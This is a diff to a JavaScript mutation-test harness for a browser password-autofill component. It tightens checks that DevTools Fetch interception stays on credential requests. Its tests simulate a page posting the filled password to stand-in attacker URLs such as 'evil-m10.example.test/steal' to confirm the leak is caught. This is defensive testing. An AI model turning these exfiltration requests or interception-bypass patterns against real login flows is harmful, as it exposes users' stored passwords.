@@ -54,10 +54,13 @@ const LF = (() => { try { return require(path.join(REPO, 'src/server/browser-log
 // the named methods HELD off the wire until release() — the late thing, held at will
 const WSClient = require(path.join(REPO, 'node_modules/ws')).WebSocket;
 const untilFact = async (read, what, ms = 15000) => { const t0 = Date.now(); for (;;) { const v = await read(); if (v) return v; if (Date.now() - t0 > ms) return markTimedOut(v, ms, what); await new Promise((r) => setTimeout(r, 5)); } };   // (a read may be async: it is awaited)
+// a Fetch mode call that takes a tab OFF the credential patterns (a Fetch.disable, or an enable of Document requests only): the
+// relaxed mode of mutant 10 and the fence lift's own sync of mutant 14 — no mode a fill puts on (all requests) is one (主开发 r4600's should)
+const fetchOffCred = (c) => !!c && (c.method === 'Fetch.disable' || (c.method === 'Fetch.enable' && Array.isArray(c.params && c.params.patterns) && c.params.patterns.length > 0 && c.params.patterns.every((pt) => pt && pt.resourceType === 'Document')));
 function heldSends(methods) {
   const held = []; let holding = false;
   class HeldWS extends WSClient {
-    send(d, ...a) { let m = null; try { m = JSON.parse(String(d)).method; } catch { /* not a call */ } if (holding && methods.includes(m)) { held.push({ method: m, go: () => super.send(d, ...a) }); return undefined; } return super.send(d, ...a); }
+    send(d, ...a) { let j = null; try { j = JSON.parse(String(d)); } catch { /* not a call */ } const m = j && j.method; if (holding && methods.includes(m)) { held.push({ method: m, params: j.params || {}, go: () => super.send(d, ...a) }); return undefined; } return super.send(d, ...a); }
   }
   return { Impl: HeldWS, held, hold() { holding = true; }, release() { holding = false; for (const h of held.splice(0)) h.go(); } };
 }
@@ -2362,7 +2365,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
           await submit10();
           await new Promise((r) => setTimeout(r, 40));   // the leg as it stood
           const heldLeak = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10p.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
-          const heldMode = await untilFact(() => hs10.held.length > 0, 'MUTANT 10 PLACED: the copy\'s relaxed Fetch mode reached the hold');
+          const heldMode = await untilFact(() => hs10.held.some(fetchOffCred), 'MUTANT 10 PLACED: the copy\'s relaxed Fetch mode reached the hold');
           const heldN = hs10.held.length;
           const m10p = fkR24.mark(); hs10.release();
           await untilFact(() => fetchModeSince(m10p).length >= heldN, 'MUTANT 10 PLACED: the released mode at the kernel');
@@ -2375,7 +2378,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         await fill10(w10, 'bp-m10');
         const m10 = fkR24.mark();
         await submit10();
-        await untilFact(() => fetchModeSince(m10).length > 0, 'MUTANT 10: the copy\'s relaxed Fetch mode (its Fetch.enable / Fetch.disable after the hold) at the kernel');
+        await untilFact(() => fetchModeSince(m10).some(fetchOffCred), 'MUTANT 10: the copy\'s relaxed Fetch mode (off the credential patterns, after the hold) at the kernel');
         const leak10 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
         ok(leak10.action === 'unwatched', 'MUTANT 10 RED (N1 hold-relaxes-fetch): relaxing wantCred on holdReason lets foreign Fetch bypass interception', { leak10, modeHeard: fetchModeSince(m10).map((c) => c.method) });
         w10.shutdown();
@@ -2436,14 +2439,15 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         const m0 = fkR24.mark();
         await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
-        await untilFact(() => w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok, 'MUTANT 14: the fence lifted');   // the flake census r2: was 40 × 10 ms (a lift that never came read «no Network.disable» for the copy's red)
+        const lifted14 = await untilFact(() => w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok, 'MUTANT 14: the fence lifted');   // the flake census r2: was 40 × 10 ms (a lift that never came read «no Network.disable» for the copy's red)
         // 主开发 r4597 (an absence is read only once the product COULD have done it): the lift's own sync sends a Network.disable FIRST and
         // its Fetch mode change after it, on the one socket — so «no Network.disable» is read once the kernel heard THAT Fetch call (the
         // tab off the credential patterns: a Fetch.disable, or an enable of Document requests only — no earlier mode of the fill is one)
-        const offCred = (c) => c.method === 'Fetch.disable' || (c.method === 'Fetch.enable' && Array.isArray(c.params && c.params.patterns) && c.params.patterns.length > 0 && c.params.patterns.every((pt) => pt && pt.resourceType === 'Document'));
-        await untilFact(() => fkR24.calls().some((c) => c.seq > m0 && c.tab === tidR24 && offCred(c)), 'MUTANT 14: the lift\'s own Fetch mode at the kernel (sent after where its Network.disable goes)');
+        const synced14 = await untilFact(() => fkR24.calls().some((c) => c.seq > m0 && c.tab === tidR24 && fetchOffCred(c)), 'MUTANT 14: the lift\'s own Fetch mode at the kernel (sent after where its Network.disable goes)');
         const netDis14 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Network.disable').length;
-        ok(netDis14 === 0, 'MUTANT 14 RED (m2 network-never-disabled): without Network.disable on fence lift, Network domain stays enabled forever', { netDis14 });
+        // 主开发 r4600 (half two): the judge is an ABSENCE, so the two waits' own results are judged with it — a lift that never came (or
+        // its sync never heard) is a failing line BY NAME, never «no Network.disable» read off a lift that did not happen
+        ok(!!lifted14 && !!synced14 && netDis14 === 0, 'MUTANT 14 RED (m2 network-never-disabled): without Network.disable on fence lift, Network domain stays enabled forever' + (lifted14 && synced14 ? '' : ` — ${lifted14 ? 'the lift\'s own sync never reached the kernel' : 'THE LIFT NEVER CAME'}, so the absence proves nothing`), { netDis14, lifted: !!lifted14, synced: !!synced14 });
         w14.shutdown();
       } else ok(false, 'MUTANT 14 RED (m2): anchor not found');
 
